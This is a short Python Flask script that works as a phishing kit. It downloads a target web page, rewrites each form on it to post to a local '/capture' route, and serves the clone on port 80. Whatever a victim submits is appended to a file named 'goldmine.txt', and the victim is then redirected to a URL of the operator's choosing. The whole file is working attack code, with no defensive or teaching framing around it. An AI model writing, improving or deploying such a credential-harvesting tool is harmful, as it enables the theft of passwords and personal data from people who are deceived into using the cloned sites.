#!C:\Python34\python

import os
import urllib.request
import requests
from flask import Flask, render_template,request,redirect,Response
from bs4 import BeautifulSoup as bs

app = Flask(__name__,template_folder=os.getcwd())

myfile=open("goldmine.txt","a")

port=80

url = input("Enter URL to clone: ")
location = input("Enter redirect URL: ")

headers = {'User-Agent':r"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"}

def main():
	fetch()
	app.run(host="0.0.0.0", port=80)
	serve()
		
@app.route('/')	
def serve():
	try:
		return render_template("index.html")
	except Exception:
		cleanup()

def fetch():
		opener = urllib.request.Request(url,None,)
		#opener.addheaders = [('User-Agent', user_agent)]
		print("Trying to get %s ..." %url)
		print("Downloading webpage...")
		data=urllib.request.urlopen(opener).read() #opener.open(url).read()
		data = bs(data, "html.parser")
		print("Modifying the HTML file ...")
		print('Injecting ["Method"] = "POST"')
		print('Injecting ["Action"] = "/capture"')

		for tag in data.find_all("form"):
			tag['method'] = "POST"
			tag['action'] = "/capture"


		with open("index.html", "wb") as index:
			index.write(data.encode("utf-8","ignore"))
			index.close()
			print("\nHTML page will redirect to: ",location)


@app.route('/capture',methods=['GET','POST'])
def capture():	
	if request.method == 'POST':
		phish = request.form
		for key in phish:
			value=phish[key]
			myfile.write(key+" : "+ value+"\n")
			
		myfile.write("\n")
		myfile.write("-"*80 +"\n\n")
		myfile.close()
		return redirect(location)

		
def cleanup():
	print("\nRunning cleanup ...")
	if os.path.exists("index.html"):
		os.remove("index.html")


if __name__=='__main__':
	main()
